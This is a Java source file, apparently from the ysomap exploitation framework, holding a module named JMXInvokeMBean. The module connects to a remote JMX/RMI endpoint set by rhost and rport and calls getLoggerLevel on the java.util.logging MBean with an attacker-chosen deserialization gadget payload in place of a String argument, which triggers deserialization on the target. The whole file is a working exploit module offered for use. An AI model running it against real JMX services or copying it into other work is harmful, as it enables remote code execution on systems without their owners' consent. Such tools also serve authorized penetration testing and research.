package ysomap.core.exploit.jmx;

import ysomap.annotation.*;
import ysomap.core.bean.Exploit;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

/**
 * @author wh1t3P1g
 * @since 2020/3/4
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets"})
@Dependencies({"need set a gadget to return"})
public class JMXInvokeMBean extends Exploit {

    @NotNull
    @Require(name = "rhost",detail = "remote JMX server host")
    public String rhost = null;

    @NotNull
    @Require(name = "rport", type = "int", detail = "remote JMX server port")
    public String rport = null;

    @NotNull
    private Object payload;
    private String payloadName;

    @Override
    public void work() {
        try {
            JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + rhost + ":" + rport + "/jmxrmi");
            JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
            MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

            ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

            mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payload}, new String[]{String.class.getCanonicalName()});

            //close the connection
            jmxConnector.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        exit = true;
    }

    @Override
    public String toString() {
        return "JMXInvokeMBean{" +
                "rhost='" + rhost + '\'' +
                ", rport='" + rport + '\'' +
                ", payloadName='" + payloadName + '\'' +
                '}';
    }
}
